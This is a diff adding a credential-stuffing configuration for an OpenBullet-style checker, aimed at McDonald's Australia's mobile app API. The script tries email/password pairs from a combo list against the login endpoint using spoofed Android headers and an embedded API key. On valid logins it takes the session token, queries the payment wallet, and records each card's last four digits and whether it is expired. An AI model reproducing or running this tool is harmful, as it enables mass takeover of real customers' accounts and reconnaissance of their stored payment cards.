@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "MaccasAU",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-22T05:41:27.0245278+01:00",
+  "AdditionalInfo": "",
+  "Author": "Coaster",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://ap.api.mcd.com/v2/customer/security/authentication?type=traditional" 
+  CONTENT "{\"password\":\"<PASS>\",\"type\":\"email\",\"loginUsername\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; unknown Build/LMY48Z)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "mcd-sourceapp: MOT" 
+  HEADER "mcd-marketid: AU" 
+  HEADER "MarketId: AU.PROD3" 
+  HEADER "mcd-locale: en-AU" 
+  HEADER "mcd-apiuid: 644e1dd7-2a7f-18fb-b8ed-ed78c3f92c2bsd" 
+  HEADER "mcd_apikey: AUDCUSANDPRODEAT932DHL2N5BXJ40KDLV5XXAU" 
+  HEADER "X-NewRelic-ID: UwUDUVNVGwIGVlVVDwkH" 
+  HEADER "Accept-Encoding: gzip" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"status\": \"ok\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"status\": \"error\"," 
+
+PARSE "<SOURCE>" LR "\"token\": \"" "\"," -> VAR "1" 
+
+REQUEST GET "https://ap.api.mcd.com/v3/customer/payment/wallet" 
+  
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; unknown Build/LMY48Z)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "mcd_apikey: AUDCUSANDPRODEAT932DHL2N5BXJ40KDLV5XXAU" 
+  HEADER "mcd-sourceapp: MOT" 
+  HEADER "mcd-marketid: AU" 
+  HEADER "MarketId: AU.PROD3" 
+  HEADER "mcd-locale: en-AU" 
+  HEADER "mcd-apiuid: 644e1dd7-2a7f-18fb-b8ed-ed78c3f92c2bsd" 
+  HEADER "Authorization: Bearer <1>" 
+  HEADER "Host: ap.api.mcd.com" 
+
+PARSE "<SOURCE>" LR "CardAlias\":\"" "\",\"" -> CAP "Last 4" 
+
+PARSE "<SOURCE>" LR ",\"IsExpired\":" ",\"" -> CAP "Expire" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\":[],\"PaymentCard\":[],\"" 
+  KEYCHAIN Success AND 
+    KEY "<SOURCE>" DoesNotContain "\"IsExpired\":true,\"" 
+    KEY "<SOURCE>" DoesNotContain "\":[],\"PaymentCard\":[],\"" 
+
